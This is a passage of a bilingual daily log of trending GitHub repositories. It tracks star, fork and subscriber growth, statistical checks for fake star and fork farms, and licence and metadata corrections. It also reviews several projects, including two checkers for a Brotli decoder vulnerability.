+| `interplains/zero-breach` | **档案更正（上游）** | ⭐⭐⭐⭐⭐ 本档案此前的 `stars_delta` 记的是**下游** `Zero-Breach-Toolkit` 的数据（4,475⭐ / 12,477 KB / fork 473 / subs 42 / v0.1.13）并称两者是改名关系 —— **经 `id` / `fork` / `parent` / `created_at` / release 列表五字段交叉确认，两者各自独立创建（`id 1424399708` vs `id 1433297111`，均 `fork=False` / `parent=None`）**。本档案正文描述的始终是**上游**，故只更正元数据：**1,218⭐** ⑂97 · subs 13 · oi 0 · 499 KB · 57 commits · **9 个 release（v0.1.0–v0.1.8，每个 19 个 asset）** · `pushed_at` 仍停在 **2026-10-20T14:26:41Z（19 天无 push）**。⭐⭐ 另更正 2026-10-30 日报「上游 releases 0 个」的记录 —— 实测为 9 个。下游已另建 `projects/zero-breach-toolkit.md` |
+| `voyager-so/vork` | 增长 | 197 → **850⭐**，forks 13 → 55，subs 4 → 7，commits 1 → **5**，`pushed_at` 2026-11-07T20:54:07Z |
+| `JosssphZhou/poki` | 增长 | 406 → **493⭐**，forks 83 → 105，subs 仍为 **1**，commits 23 → **121**，oi 0 → 14，`pushed_at` 2026-11-07T18:27:05Z |
+| `majorminorlabs/hermes-voice` | 增长 | 424 → **499⭐**，forks 20 → 28，subs 3 → 5，commits 仍 35，`pushed_at` 2026-11-06T21:59:50Z |
+| `devvmhq/devvm` | 增长 | 116 → **353⭐**，forks 2 → 12，subs 1，commits 600 → **611**，`pushed_at` 2026-11-07T22:17:57Z |
+| `Tropicaldrescoop/discord-id-osint-checker` | 增长但 commits 停滞 | 329 → **381⭐**，forks 73 → 87，subs 仍 0，commits 仍 43，**`pushed_at` 2026-11-07T03:26:48Z 而最后 commit 为 2026-10-30T12:13:22Z** |
+| `rddmwmddr/android-ad-cleaner` | 增长 | **6,924⭐** ⑂620 · subs 15 · oi 208 · `pushed_at` 2026-11-07T16:13:18Z（持续活跃） |
+| `valentderah/totk-pc-recomp` | 增长 | **5,670⭐** ⑂467 · subs 68 · oi 360 · `pushed_at` 2026-11-07T17:41:26Z |
+| `unclebob/ub-mode` | **⭐⭐⭐⭐ 增长但无新提交** | **7,252⭐** ⑂407 · subs 56 · oi 10 · **`pushed_at` 停在 2026-11-02T15:08:31Z** —— **⭐⭐⭐⭐⭐ 本日记录的第二个「star 与开发解耦」样本**：它 11-02 之后 star 从 341 涨到 7,252（+2,027%），而 commit 与 `pushed_at` 都没动，**且这是它首次出现两位数的 subs（56）** —— ⭐⭐⭐⭐ **但本日已证明 subs 可被 README 索取 star 抬高，故此处的 56 需在下一日复测中观察其构成** |
+| `DenisSergeevitch/ex-ussr-kinship-research` | 增长 | **2,137⭐** ⑂216 · subs 14 · oi 0 · `pushed_at` 2026-11-07T21:16:24Z（活跃） |
+| `SAOS-3624/dsh-see-now` | 增长 | **462⭐** ⑂43 · subs 1 · oi 14 · `pushed_at` 2026-11-07T09:19:58Z |
+| `trailofbits/brotli-checker` | 停滞 | 68⭐ ⑂4 · subs 0 · oi 3 → 9 · `pushed_at` 2026-11-06T08:25:52Z，**最后 commit 仍为 2026-10-27T20:20:25Z** |
+| `YoyoLin008/mcreplay` | **停滞** | 199⭐ ⑂12 · subs 0 · oi 0 · **`pushed_at` 仍为 2026-10-24T18:56:03Z**（连续第 14 天无新 push） |
+| `HerdBuilderEstimate/roblox-studio-mcp` | 无变化 | 427⭐ ⑂260 · subs 8 · `pushed_at` 仍为 2026-11-06T06:16:56Z |
+| `JenkinWoo/sheeridVerify` | **⭐⭐⭐⭐⭐ 增长但无新提交** | **1,637⭐** ⑂889（fork/star 54%）· subs 0 · oi 0 · `pushed_at` 2026-11-06T09:54:37Z —— ⭐⭐⭐⭐⭐ **fork 间隔中位数复测为 74.0 秒（19/99 个间隔 ≤10 秒，跨度 404.8 分钟），与 11-06 的 73 秒一致，仍属真人节奏；但它是本日全部候选中 fork 数增长最快的一个（360 → 889）且 subs 仍为 0** —— ⭐⭐⭐⭐ **「fork 涨、commit 不动、subs 为 0」三者同时成立，是本日最需要下一日复测的组合** |
+| `deepseek-ai/DeepInfer` | 增长 | **25,602⭐** ⑂3,137 · subs 65 · oi 247 · `pushed_at` 2026-11-03T07:31:59Z（**star 继续涨而 push 停在 11-03**） |
+
+### 排名变化
+
+- **新增**：`lxe/phoneuse` / `Th0rgal/satmux` / `MajestyPoemFold/ghostclick-mouse-double-click-fix` / `dabingfy-dot/solo-to-team-skills`（真项目）＋ `Poltergeistlunagrid/Steam-Idler` / `sentinelsoldierprize/Minecraft-AFK-Bot`（反例样本）
+- **⭐⭐⭐⭐⭐ 方法论变更**：11-07 记录的「看 fork 的时间分布与账号年龄分布」本日继续有效（机器 4–6 秒 vs 真人 74 秒 / 1555 秒），**但新增一条更前置的规则** —— **先查 README 是否索取 star，再看 subs**。
+- **⭐⭐⭐⭐⭐ 档案修正**：`projects/zero-breach.md` 的仓库指向需改为 `interplains/Zero-Breach-Toolkit`（内容与 URL 同步），或档案内容需整体重写以匹配 `interplains/zero-breach`。**本日报已记录该发现，未擅自改写历史日报正文。**
+
+## 2026-11-07
+
+### 本日新增项目
+
+| 项目 | ⭐ | forks | fork/star | subs | 语言 | 体积 | commits | 类别 |
+|---|---:|---:|---:|---:|---|---:|---:|---|
+| `voyager-so/vork` | 197 | 13 | 6.6% | 4 | Rust | — | 1（1,502 blobs） | 观察型 |
+| `JosssphZhou/poki` | 406 | 83 | 20.4% | 1 | TypeScript/JS | — | 23 | 生产可用 |
+| `majorminorlabs/hermes-voice` | 424 | 20 | 4.7% | 3 | Python | 411 KB | 35 | 工具型 |
+| `JenkinWoo/sheeridVerify` | 540 | 358 | 66% | 0 | JavaScript | 408 KB | 1 | 观察型 |
+| `HerdBuilderEstimate/roblox-studio-mcp` | 427 | 260 | 61% | 8 | Python（自述 Node.js/TS） | 7 KB | 4 | 观察型（反例样本） |
+| `devvmhq/devvm` | 116 | 2 | 1.7% | 1 | Go | — | 600 | 基础设施候选 |
+| `Tropicaldrescoop/discord-id-osint-checker` | 329 | 73 | 21% | 0 | HTML | 3172 KB | 43 | 观察型（待核验样本） |
+
+**⭐⭐⭐⭐⭐ 本表最重要的一列是 fork/star，而不是 ⭐。** farm 那四个仓库是 61%–91%，而同一份榜单上三个真项目是 4.7%–20.4% —— **但单看这一列仍会误判**，必须配合下面的 fork 时间分布表。
+
+### ⭐⭐⭐⭐⭐ fork 时间分布（本日报新提取的判据）
+
+| 仓库 | forks | 间隔中位数 | p10 / p90 | ≤10s 占比 | 时间跨度 | 判定 |
+|---|---:|---:|---|---:|---|---|
+| `roblox-studio-mcp` | 260 | **5.0 s** | 3 / 6 s | **96.9%** | 27 分 35 秒 | 机器 |
+| `roblox-performance-tool` | 386 | **6.0 s** | 5 / 8 s | **94.5%** | 44 分钟 | 机器 |
+| `sheeridVerify` | 360 | **73.0 s** | 12 / 277 s | **8.9%** | 12.5 小时 | 真人 |
+| `discord-id-osint-checker` | 73 | **496 s** | 19 / 1415 s | **5.6%** | 12.7 小时 | 中间态，待观察 |
+
+**⭐⭐⭐⭐⭐ 按 fork 总数排序是错的**：360 > 260 > 73 > 386 会把 sheeridVerify 排在农场前面，而它的间隔中位数是 73 秒、抽样 12 个 fork 拥有者账号创建时间跨越 2015–2026 共 11 年。
+
+### ⭐⭐⭐⭐⭐ commit 时间戳的秒字段熵（同日新判据）
+
+| 仓库 | commits | 不同秒值数 | author==committer | commit 时间跨度 |
+|---|---:|---:|---:|---|
+| `JosssphZhou/poki` | 23 | **20** | 19/23 | 2026-11-05..06 |
+| `majorminorlabs/hermes-voice` | 35 | **25** | 35/35 | 2026-11-05..06 |
+| `devvmhq/devvm` | 100（首页） | **49** | 98/100 | 2026-11-05..06 |
+| `HerdBuilderEstimate/roblox-studio-mcp` | 4 | 4 | 4/4 | 2026-11-06 |
+| `Tropicaldrescoop/discord-id-osint-checker` | 43 | **2** | 43/43 | 2026-08-13..10-30（回填） |
+
+**43 个 commit 只落在 2 个秒值上（21 与 22），且 39/43 的消息前缀是 `assets:` 或 `design:` —— 合成痕迹。**
+
+### 持续跟踪项目状态
+
+| 项目 | 变化 | 说明 |
+|---|---|---|
+| `interplains/zero-breach` | slug 修正 | 档案为 `projects/zero-breach.md`，此前生成的 `projects/zero-breach-toolkit.html` 是**指向从未存在过的源档案的坏链接**，本日报已修正 |
+| `voyager-so/vork` | 新增 | `license.spdx_id` = NOASSERTION **是作者主动选择**（LICENSE 首行写明「It is not open source」）—— 与「NOASSERTION 但 LICENSE 其实清晰可辨」是性质相反的两类问题 |
+| `majorminorlabs/hermes-voice` | 新增 | 本日报记录到的**第三种边界结构化形态**（前两种：vork 的许可声明、poki 的验证文档），本形态为**决策契约**（`DECISIONS.md` 19 条） |
+| `devvmhq/devvm` | 新增 | 第三个「`created_at` 说谎」案例（仓库当天创建、600 commits 起始于 13 天前，因迁入当天新建的组织） |
+
+### 排名变化
+
+- **新增**：vork / poki / hermes-voice / sheeridVerify / roblox-studio-mcp / devvm / discord-id-osint-checker
+- **本日无既有项目发生可核验的显著排名变动**（自 2026-10-30 以来本仓库无新日报，2026-11-01..06 的日报文件在本仓库中不存在，本日为首个可核验窗口）
+
+## 2026-10-26
+
+### assetnote/node2shell-scanner (48 stars, fork 6) - trailofbits/brotli-checker (44 stars, fork 3) - unclebob/ub-mode (341 stars, fork 16) - DenisSergeevitch/ex-ussr-kinship-research (526 stars, fork 48) - KohakuBlueleaf/KohakUnlock (148 stars, fork 9) - mirkobrombin/raven (378 stars, fork 8, REWRITTEN AND RELICENSED) = today's signal is not the CVE but that two vendors, in different technical layers, on the same CVE, both refused to collapse "uncertain" into a single output state: assetnote/node2shell-scanner (18.5 hours 48star fork 6 fork/star 12.5%, Python MIT 11 KB, Organization assetnote created 2018-01-09 with 40 public repos and 995 followers, THE WHOLE REPOSITORY HAS ONLY 1 COMMIT, the contributors API returns 1 person, the releases API returns 0 entries, topics is an empty array, subs 1 oi 0) takes the ACTIVE route and its verdict is a THREE-CONDITION CONJUNCTION rather than "the probe succeeded" - "A target is reported vulnerable only when the full probe reaches the valid route-response class, the malformed-response class is distinct, and the final control confirms the endpoint remained stable. This matches Assetnote's internal postmodule detection logic and does not execute a command." - three separable assertions each blocking a different false-positive source: the probe was actually decoded and routed rather than swallowed by a middlebox, the malformed input produced a DIFFERENT response class rather than the same empty 200, and the endpoint did not crash and thus did not merely look different. - the probe is a verifiable constant: PROBE_BYTES = 23_068_764, PROBE_REPETITIONS = (1 << 21) - 1, PROBE_PREFIX / PROBE_UNIT f5a8473dea518f7ad4a31e / PROBE_SUFFIX concatenated with a SELF-CHECK ASSERTION that the assembled length equals PROBE_BYTES, so the probe size is guaranteed by the code itself and not by a comment - the four one-byte controls are FIXED REGISTRY entries in request_evidence(): ff with Content-Encoding br and no Content-Type, 3b with br and application/json, ff with br and application/json, and x with an unsupported encoding, where the fourth is a NEGATIVE control that reveals how the endpoint behaves when it cannot decode - response comparison demands BYTE-EXACT equality via same_exact() which requires both sides to have error is None, NEITHER TRUNCATED, identical status code, identical content-type and byte-identical bodies, plus a weaker status-only mode - scan_url() returns vulnerable as soon as ANY path matches, which is the correct existential semantics for the presence of a flaw - and the three-state output is the single most transferable thing in this batch: vulnerable is true, false, or null with the null case reported as verdict INCONCLUSIVE together with a recorded error reason, and the exit code is raise SystemExit(1 if vulnerable_count else 0), meaning "no vulnerability found" EXITS ZERO - and its network side effect is written into the README as a recomputable number rather than a disclaimer: "Each tested endpoint receives five one-byte requests and one 23,068,764-byte probe. The probe uses Expect: 100-continue, so a proxy can reject its advertised size before the body is uploaded." - that single Expect header is real engineering, because it hands the decision about whether a 23 MB body is uploaded at all back to the deployment's own network layer - trailofbits/brotli-checker (2.3 days 44star fork 3 fork/star 6.8%, Python MIT 6858 KB, 26 commits, the contributors API returns 2 people plus dependabot, the releases API returns 3 entries, topics is an empty array, SUBS 0, oi 0, Organization trailofbits with 298 public repos and 3297 followers) takes the OPPOSITE OFFLINE route and its most valuable line is a four-state exit code table in docs/usage.md where exit 0 is defined as "Reported items meet a known source or upstream-version fix rule, with no recognized scan gaps", exit 1 as affected source or version evidence found, exit 2 as invalid arguments or code-reference catalog, and exit 3 as "Review is needed: no matches, unresolved candidates, fixed-code-only evidence, or scan gaps" - and immediately after that table it states the sentence this daily considers the single most quotable finding of the day: "Affected evidence takes precedence over gaps: exit 1 can include incomplete coverage. A fixed copy does not clear another, and exit 0 does not establish that the running app is fixed." - it also separates the conclusion into four claims that must not be collapsed into one: "Finding vulnerable source establishes source containment. Build selection, shipment, attacker-controlled input reaching that decoder, and exploitability are separate conclusions. Keep a result for each copy; one fixed copy cannot clear other copies." - it refuses to compare against a single version number because the advisory ranges are DISJOINT, stating "The CNA record has disjoint Brotli version ranges. A single comparison against 1.2.1 would incorrectly warn on fixed 1.0.10 and 1.1.1." and then listing Brotli 1.0.3-1.0.9 to 1.0.10, 1.1.0 to 1.1.1, 1.2.0 to 1.2.1 and Node 22.x to 22.23.4, 24.x to 24.22.1, 26.x to 26.12.1, and refusing to transfer one provider's fixed revision to another because "An older version can contain a vendor backport" and "An updated host package does not establish the state of a container, native extension, or statically linked executable" - its fingerprints.json carries a DATE rather than a freshness claim, with schema_version, cve, verified_on "2026-10-23", upstream_fix, inventory_revision and a verification field reading "Fetched upstream releases and pinned inventory source; verified Git blob and SHA-256, and compared block-switch handling with upstream fix. Source-file evidence only." plus SECURITY.md stating "Advisory rules and compiled references are snapshots, and an old checkout does not automatically receive new guidance" - and it explicitly marks what it cannot reach: "HTTP headers cannot establish the decoder's patch status" and "Do not send malformed streams or exploit probes" - THE TWO TOOLS TOGETHER STILL DO NOT ANSWER "is this machine safe right now", because the active one proves reachability but not exploitability while the offline one proves presence but not reachability, and both wrote that gap into their own output states instead of leaving it for the reader to fill in - unclebob/ub-mode (6.8 hours 341star fork 16 fork/star 4.7%, THE REPOSITORY HAS NO LANGUAGE FIELD, THERE IS NO LICENSE FILE AT ALL AND license.spdx_id IS NULL meaning default copyright retention, ONLY 2 FILES, ONLY 4 COMMITS, the contributors API returns 1 person, the releases API returns 0 entries, topics is an empty array, subs 1 oi 1, Account unclebob created 2008-11-27 with 106 public repos and 17434 FOLLOWERS) is a POINTER rather than an implementation and it binds three principles to three REAL INDEPENDENT TOOL REPOSITORIES: unclebob/crapper 109star fork 14 Python 0BSD enforcing CRAP below 10, unclebob/dryer 43star fork 9 Python 0BSD enforcing duplication below 0.8, unclebob/mutator 58star fork 8 Python 0BSD doing cover the uncovered, kill the survivors, delete dead code, plus unclebob/uml-viewer 449star fork 51 Clojure with a null spdx id for visualisation - the README states it "relies on deterministic quality-gate tools to enforce structure, complexity, duplication, and test thoroughness" - and the sharpest criterion is executable: "Test Behavior, Not Implementation - The test calls the code the way its user does and checks the result that user would see. If the test would still pass when every function returned nothing, throw it out." - while the single most transferable rule in this batch is Attack the Premise: "When two fixes that share one premise fail the same gate, write that premise in one sentence and count which actors hold the imbalance. Remove the assignment. Do not start another fix until you have done that." - this is the most valuable line of the day because it needs NO TOOL AT ALL, and it targets exactly what this batch observed: 17 repositories sharing one structural template, 3 repositories sharing one CVE trigger, and 2 Android projects sharing one device-operation discipline - DenisSergeevitch/ex-ussr-kinship-research (12.8 hours 526star fork 48 fork/star 9.1%, Python MIT 642 KB, 41 commits, THE CONTRIBUTORS API RETURNS 4 PEOPLE DenisSergeevitch korotaS Smolevich Smyshnikof, the releases API returns 2 entries v1.4.0 and v1.5.0, 8 topics, SUBS 7 THE HIGHEST IN THIS BATCH, oi 0, Account DenisSergeevitch created 2012-08-12 with 48 public repos and 1102 followers) makes the technical core an idea called independence_group - "Copies and mirrors of one record share an independence_group, so they never count as independent proof" - AND THAT RULE IS ENFORCED BY CODE RATHER THAN BY PROSE, because scripts/audit_evidence.py at 19284 bytes only counts non-empty independence_group values that are equal after casefold, and it carries two HARD CHECKS that raise errors: a declared independence_group to which no artifact_id belongs is an error, and a claim marked strongly-corroborated with no direct record at all is an error - meaning "I can declare that two records corroborate each other" is IMPOSSIBLE TO ASSERT OUT OF THIN AIR AT THE CODE LEVEL - evidence status is SIX DISCRETE STATES rather than a percentage, with the README stating "Claims get explainable statuses, not percentages" and the states being hypothesis, single-source, corroborated, strongly-corroborated, contradicted and unresolved, where the presence of contradicted and unresolved is what keeps the model honest - seven source-originality levels from original through image-of-original, official-extract, index, transcription, derivative to unknown, with the explicit warning "Неизвестное происхождение резко снижает пригодность артефакта, даже если изображение выглядит убедительно" - and evals/discovery-and-logic.yaml at 27697 bytes turns what the skill must NOT do into a REGRESSION CONTRACT, with should_trigger covering Chinese Russian Ukrainian and English questions, should_not_trigger covering requests to find a former partner's current address and phone or to break into a relative's private accounts, and behavioural cases including conflicting_birth_dates where a military card saying 1902 and a death record saying 1904 must be stored as TWO SEPARATE CLAIMS and NOT AVERAGED, captcha where the expected behaviour is NOT to solve the captcha for the user and NOT to use solvers VPNs proxies fingerprint spoofing changed User-Agents or tokens, and reply_in_user_language where an English-only user gets an English answer with original-spelling citations plus translation and search terms constructed in the source language - KohakuBlueleaf/KohakUnlock (21.5 hours 148star fork 9 fork/star 6.1%, C GPL-2.0 62 KB, ONLY 3 COMMITS, the contributors API returns 1 person, the releases API returns 0 entries, topics is an empty array, subs 2 oi 3, Account KohakuBlueleaf created 2020-01-09 with 110 public repos and 1028 followers) is a GPU firmware-unlock research port whose most valuable asset is NOT the unlock code but a failure model written as a NON-NEGOTIABLE ORDER OF OPERATIONS: "Once writes may have reached the GPU, an unverified result retains DMA backing/BAR ownership and a driver_override string that prevents NVIDIA matching this device. The boot hook MUST check handoff_safe and halt before udev/NVIDIA if it is not Y." and "Do not delete the driver_override, unload the module, free memory, force-bind NVIDIA or continue from the failure shell. Capture the console, then fully power off/on into the known-good entry. SSH cannot recover a host stopped before networking starts. A warm reboot may not reset all GPU state. Do not automatically retry an uncertain hardware mutation." and "Timeouts bound software polling but cannot guarantee recovery from an unresponsive PCI/MMIO transaction. A successful host simulation is not evidence of hardware quiescence. A successful unlock boot is not long-term stability certification." - execution is OFF BY DEFAULT because make module builds a HARDWARE-EXECUTION-DISABLED module unless ENABLE_EXPERIMENT=1 is passed, make test is CPU-only and firmware-free with no GPU or sudo needed - profiles are bound EXACTLY by BDF 42:00.0, Leadtek subsystem ids, exact native firmware hashes and descriptors, 22 GiB capacity, workspace=1 and observed selectors 0/0, with the README stating "Same marketing name or VBIOS version is insufficient" and "Existing device binding causes refusal; never unbind a working display GPU to bypass this" - it lists what it does NOT do, "No VBIOS flashing, fuse programming, bus-wide reset, power-limit modification or overclock is implemented", "No module unload path exists for the executor. Reboot is the lifecycle boundary." and "No automatic persistence installer exists. First attempt must be a one-time boot with a separate known-good default." - AGENTS.md writes for agents too: "Do not load a module, access BARs, change bindings, reboot, modify boot settings or run firmware without explicit authorization and verified recovery access", "Do not weaken guards to make another board run", "Keep runtime source and model tests synchronized; label simulations vs hardware evidence" and "No automatic public hardware runner in CI" - its results table even records where it did NOT win, with a 2080 Ti FP16-to-FP32 32x8x16 moving from 59.9 to 111.0 TFLOPS for +85.3 percent on the same card while the FP16-to-FP16 CONTROL GROUP moved only from 119.5 to 118.5, a 125-shape sweep from 57.71 to 88.24 for +52.9 percent explicitly labelled not same-card A-B, and the statements "A successful kernel log alone is not proof of higher throughput" and "This is not a claim of a 2x application/game speedup" - and it separates physical modification from software unlocking: "The 22 GB cards are physically VRAM-modded, not factory 22 GB models. Both the unlocked card and locked comparison card already had that modification. This software unlock does not add VRAM, and the repository does not provide a memory-soldering guide." - mirkobrombin/raven (378star fork 8 fork/star 2.1%, C++, license.spdx_id NOASSERTION with a root LICENSE that is GPL-3.0-or-later, 18529 KB, 678 commits, subs 4 oi 8, pushed_at 2026-10-25T20:58:09Z which is only about 36 minutes before the snapshot, created_at STILL 2026-10-24T17:13:42Z which is STILL A RENAME TIMESTAMP) WAS REWRITTEN AND RELICENSED WITHIN 24 HOURS AND EVERY CODE-STRUCTURE DESCRIPTION THIS DAILY RECORDED ON 10-25 IS NOW VOID - four independent pieces of evidence agree: the language field changed from Go to C++ with a recursive tree query counting ZERO GO FILES AND 354 C AND C++ FILES, license.spdx_id changed from MIT to NOASSERTION, the root LICENSE first line changed from MIT License to the GNU General Public License, and cmd/govm/ plus pkg/ NO LONGER EXIST in the root tree - the 25 commits between the two snapshots ARE the change log, and two of them prove it directly: 2026-10-25T10:01:28Z "chore: license the host under GPLv3 and preserve guest terms" and 2026-10-25T10:14:38Z "chore: remove the legacy Go runtime and tooling", alongside 2026-10-25T14:38:11Z "fix: avoid string replacement on mingw's gcc directory (#13)" which is THE ONLY COMMIT WITH A PR NUMBER and therefore the only verifiable external-contribution signal, plus "feat: add an experimental X11 desktop backend", "fix: store a 32-bit pointer for LoadStringW in x86 processes", "docs: add contribution guidelines" and "docs: reserve co-author credits for human contributors" - and THE MOST IMPORTANT FINDING OF THE DAY IS HOW IT RELICENSED, because it DID NOT PRETEND IT HAD ALWAYS BEEN GPL: LICENSES.md states "Raven's Linux host runtime is GPL-3.0-or-later. Original Raven guest adapters listed in LICENSES.json remain MIT-licensed. Imported source keeps its copyright, license notices and any exceptions. Earlier MIT grants remain valid. The release is a collection of components with these terms, not a single MIT or GPLv3 license applied to every file." and the README repeats "Earlier MIT grants remain valid." - and LICENSES.json makes it MACHINE-READABLE with schema_version 1, review_date "2026-10-25", original_code_license "GPL-3.0-or-later with MIT guest-adapter exceptions", four license_references and ELEVEN COMPONENTS each carrying paths license review and provenance, where the guest-adapter MIT entry lists 60 EXACT FILE PATHS rather than a directory name, the review field is a FIRST-CLASS VALUE so the External build inputs entry can honestly say requires-release-inventory, and review_date is a DATE rather than a freshness claim - THIS SINGLE CHANGE RESOLVES TWO LICENCE-METADATA PROBLEM CLASSES THAT THIS DAILY HAD TRACKED FOR DAYS, namely "NOASSERTION but an unambiguous LICENSE file" and "correct top-level licence but the composite licence was collapsed into prose", and it happened WITHIN TWO DAYS of this daily criticising raven for exactly that on 10-25, which is the first complete loop this daily has seen of a project turning external criticism into a machine-readable manifest - and the four honest-engineering documents SURVIVED the rewrite: the four-stage 25 percent compatibility table, the benchmark invalidation with its reason, the alternating-round benchmark method and the published test-skip conditions are all verified unchanged in the current README, which proves the method is independent of the implementation language - THE FOURTH TREND IS THE MOST IMPORTANT ONE FOR METHODOLOGY: three of yesterday's projects turned their heat into non-adoption signals while one project produced the clearest genuine adoption evidence of the day - rddmwmddr/android-ad-cleaner went from 140 to 728 stars which is PLUS 418 PERCENT with forks 12 to 54, subscribers 1 to 5 and OPEN ISSUES 6 TO 22, and those 22 issues include five verified CONCRETE CHINESE USER FAILURE DESCRIPTIONS "#35 无法打开exe主程序", "#34 [问题] 跳出弹窗就会卡住", "#33 [问题] 如果是第一次进入app会卡住", "#32 feat: 新增小米/Redmi/POCO 专属优化与遥测管理模块 (miui-opt)" and "#31 [问题] 操控手机时操控不对" where issue 32 is a FEATURE REQUEST meaning someone is actually using it and asking for more - while songjianyang/xss-audit went from 194 to 393 stars which is PLUS 103 PERCENT AND STILL HAS ONLY 1 COMMIT with the commits API returning length 1, the single commit dated 2026-10-24T11:32:14Z, and 35 HOURS OF ZERO SUBMISSION SINCE, so the cleanest sample of the day is "heat doubled, code did not move" - and YoyoLin008/mcreplay went from 122 to 200 stars which is PLUS 64 PERCENT WHILE SUBSCRIBERS_COUNT IS STILL 0 with pushed_at 2026-10-24T18:56:03Z - AND THE SAME 438-SECOND WINDOW PRODUCED 17 STRUCTURALLY IDENTICAL REPOSITORIES, created between 2026-10-25T09:46:39Z and 09:53:57Z, each with EXACTLY 2 FILES being LICENSE at 1074 bytes and README.md at 3324 bytes, a total size of 2 to 3 KB, stars drawn from the three-value set 13/14/15, forks from the two-value set 4/5, topic counts from 12/16/17/20, all owners of type User with mutually NON-LEXICAL account names, content differing only in the substituted game name, and a sampled README whose image address is STILL AN UNEXPANDED TEMPLATE PLACEHOLDER "{{https://i.postimg.cc/kG0NNBzc/banner.png}}" - WHICH MEANS THAT A MEASURABLE SHARE OF TODAY'S STAR GROWTH IS ATTENTION RATHER THAN ADOPTION, AND THE DISCRIMINATOR MUST BE SUBSCRIBERS, OPEN ISSUES, PUSHED_AT AND FILE STRUCTURE RATHER THAN STAR COUNT - THE EVENT ITSELF IS VERIFIED UPSTREAM: the CVE-2026-111497 repository tide ran 2, 9, 16, 12 and 11 across 10-21 to 10-25 with 39 description matches all created after 10-20, and google/brotli fix commit 0ed4268a4401abcb4472096340477cf4af7d1a2b titled "Detect and report invalid stream earlier." dated 2026-02-27T13:10:32Z shipped in v1.0.10, v1.1.1 and v1.2.1 all published 2026-10-21T19:26 to 19:27Z, while nodejs/node v22.23.4, v24.22.1 and v26.12.1 all published 2026-10-21T10:38Z with CHANGELOG_V22.md and CHANGELOG_V24.md actually containing the lines "(CVE-2026-111497) deps: brotli: cherry-pick 0ed4268a4401abcb44720963" and "src: expose BROTLI_DECODER_ERROR_FORMAT_BLOCK_SWITCH" - SO THE CLAIM THAT THE FIX SHIPPED ON 10-21 HAS PRIMARY UPSTREAM EVIDENCE RATHER THAN SECOND-HAND REPETITION - CONTINUITY: the McDonald's contest RANKING.md advanced from "2026-10-25 06:00:57" to "2026-10-26 00:01:01" with entries dropping from 102 to 101 and mcreplay climbing from rank 37 to rank 23 with 201 stars, while the official README states the contest ranks by PUBLIC STAR DATA, meaning THE LEADERBOARD RANKS BY A PARTICIPATION METRIC RATHER THAN AN ADOPTION SIGNAL; deepseek-ai/DeepInfer reached 22374 stars with pushed_at now 2026-10-25T11:59:27Z which ENDS the five-day run of no pushes, but the commit is a single fix "validate boolean environment variables with strict parsing (#218)" and one commit does not restore development activity, and this daily's 10-25 reading of "one small fix plus long stagnation" is the more accurate framing; and Snapintosh/Snapintosh reached 942 stars with pushed_at 2026-10-25T05:05:43Z which is CLOSER to the snapshot than the previous one, license.spdx_id still NOASSERTION for the sixth day, and the 10-24 observation about which of the 7 split-out sub-repositories would gain external stars first still has the SAME ANSWER AT 72 HOURS: q1n1 is still at 35 stars and the other six are still at ZERO.
+
+> 证据边界：项目名称、星标、topics、description、license、size、forks 来自 2026-10-26 GitHub REST/Search API（gh CLI 认证，UTC 2026-10-25T22:55:09Z 单一快照）+ 公开元数据（created_at / pushed_at / stargazers_count / forks_count / subscribers_count / open_issues_count / language / description / topics / license / size / owner.type）+ 各项目 README、SKILL.md、AGENTS.md、docs/SAFETY.md、docs/usage.md、references/advisory.md、references/fingerprints.json、LICENSES.json、LICENSES.md、NOTICE.md、SECURITY.md、evals/discovery-and-logic.yaml、scripts/audit_evidence.py 与仓库树原文摘录（gh api .../readme 与 .../contents/{...} 以 Accept:application/vnd.github.raw 抓取）+ 仓库树（gh api .../git/trees/HEAD 与 ?recursive=1）+ 历史与贡献者规模（gh api .../commits 含 Link 头分页 与 .../contributors）+ 账号与组织信息（gh api users/{owner} 与 orgs/{org}）。X 小时 / Y 天 Z star is a rough lower bound based on created_at to 2026-10-26 total stars divided by elapsed time; NO per-day star delta was measured because the stargazers endpoint RETURNED 404 FOR THIS TOKEN so star timestamps are unavailable, THEREFORE EVERY GROWTH FIGURE HERE IS A DIFFERENCE BETWEEN TWO SNAPSHOTS AND NOT A SAME-DAY INCREMENT, AND NONE OF THEM MAY BE READ AS USER COUNT. Fields verified to be zero or empty are labelled: **the contributors API returns 1 person for assetnote/node2shell-scanner, unclebob/ub-mode and KohakuBlueleaf/KohakUnlock, 2 people plus dependabot for trailofbits/brotli-checker, and 4 people for DenisSergeevitch/ex-ussr-kinship-research**; **the releases API returns 0 entries for assetnote/node2shell-scanner, unclebob/ub-mode and KohakuBlueleaf/KohakUnlock, 3 entries for trailofbits/brotli-checker and 2 entries for ex-ussr-kinship-research**; **topics is an empty array for node2shell-scanner, brotli-checker, ub-mode, KohakUnlock and gdirect**; **subscribers_count are 1, 0, 1, 7, 2, 4, 1, 5, 1, 3, 0, 53 and 10** with brotli-checker's 0 the lowest and ex-ussr's 7 the highest among the new projects. **Two verifiable metadata problems found today**: unclebob/ub-mode has NO LICENSE FILE AT ALL with license.spdx_id null meaning default copyright retention, which is the single most easily overlooked fact in a 341-star repository and it is notable because three of its four companion tools are explicitly 0BSD; and mirkobrombin/raven changed license.spdx_id from MIT to NOASSERTION which for a genuinely mixed-licence project is the HONEST answer rather than a defect, but tooling that scans licences will report a non-standard licence. **The single most consequential verified change is raven's rewrite and relicensing, proven by four independent sources**: the language field changed from Go to C++, a recursive tree query counts 0 Go files and 354 C and C++ files, the root LICENSE changed from MIT to GPL-3.0-or-later, and two commits dated 2026-10-25T10:01:28Z and 10:14:38Z prove the licence change and the Go removal directly. **The fourth class of bulk anomaly was found today, distinct from the three classes already recorded**: 17 repositories created within 438 SECONDS between 2026-10-25T09:46:39Z and 09:53:57Z with exactly 2 files, 2 to 3 KB total size, a three-value star set of 13/14/15, a two-value fork set of 4/5, topic counts of 12/16/17/20, mutually non-lexical User account names, content differing only in the substituted game name, and an unexpanded template placeholder in the README image URL; the same 15-minute search window returned 3822 repositories on GitHub's side so these 17 are one isomorphic cluster inside that window rather than all of it. **The event is verified against upstream primary sources**: google/brotli fix commit 0ed4268a4401abcb4472096340477cf4af7d1a2b authored 2026-02-27T13:10:32Z, security releases v1.0.10, v1.1.1 and v1.2.1 all published 2026-10-21T19:26 to 19:27Z, nodejs/node v22.23.4, v24.22.1 and v26.12.1 all published 2026-10-21T10:38Z, with CHANGELOG_V22.md and CHANGELOG_V24.md actually containing the CVE-2026-111497 cherry-pick line and the BROTLI_DECODER_ERROR_FORMAT_BLOCK_SWITCH line. **New verification gaps declared by this daily**: node2shell-scanner's exchange_post() HTTP state machine and brotli-checker's brotli_inventory.py traversal were NOT read 